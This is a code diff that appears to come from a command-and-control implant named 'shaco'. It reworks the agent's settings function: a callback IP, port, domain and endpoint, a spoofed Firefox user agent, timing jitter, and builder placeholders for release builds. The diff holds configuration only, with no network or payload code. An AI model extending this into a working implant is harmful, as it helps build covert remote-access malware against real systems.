@@ -2,39 +2,55 @@
 
 #include "../Common/shaco_stdlib.h"
 
+#ifdef DEBUG
 #define IP "127.0.0.1"
-#define ENDPOINT ""
+#define ENDPOINT "/"
 #define DOMAIN "google.com"
 #define USERAGENT "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0"
 #define VERSION "0.1"
-#define TIMEOUT 10
+#define TIMEOUT 5
 #define PORT 8080
-#define USESSL false
+#define MAXTIMEOUT 0
+#else
+#define IP "%IP%"
+#define ENDPOINT "%ENDPOINT%"
+#define DOMAIN "%DOMAIN%"
+#define USERAGENT "%USERAGENT%"
+//#define VERSION "%VERSION%"
+#define TIMEOUT %TIMEOUT%
+#define MAXTIMEOUT %MAXTIMEOUT%
+#define PORT %PORT%
+#endif
 
-static PSETTINGS settings = NULL;
-
+static PSETTINGS sett = NULL;
 PSETTINGS get_settings(){
-    
-    if(settings != NULL) return settings;
+    if(sett != NULL) return sett;
+
+    int port = PORT;
+    int timeout = TIMEOUT;
+    int jitter = MAXTIMEOUT;
+    uint8_t domain[] = DOMAIN;
+    uint8_t ip[] = IP;
+    uint8_t endpoint[] = ENDPOINT;
+    uint8_t useragent[] = USERAGENT;
+//    uint8_t version[] = VERSION;
+
 
     PSETTINGS set = (PSETTINGS)shaco_calloc(sizeof(SETTINGS),1);
     if(!set) return NULL;
-    StringCopy(set->domain, DOMAIN);
-    StringCopy(set->ip, IP);
-    StringCopy(set->endpoint, ENDPOINT);
-    StringCopy(set->useragent, USERAGENT);
-    StringCopy(set->version, VERSION); //TODO: get atualization
+
+    StringCopy(set->domain, (char *)domain);
+    StringCopy(set->ip, (char *)ip);
+    StringCopy(set->endpoint, (char *)endpoint);
+    StringCopy(set->useragent, (char *)useragent);
     
-    set->port = PORT;
-    set->quit = false;
-    set->ssl = USESSL;
-    set->close = true;
-    set->timeout = TIMEOUT;
-    set->jitter = 0; //TODO: implement this
-    settings = set;
+    set->port = port;
+    set->ssl = false;
+    set->timeout = timeout;
+    set->max_timeout = jitter;
+    sett = set;
     return set;
 }
-
 
 #ifdef SETTINGS_GET_REMOTE
 PSETTINGS get_remote_settings(){
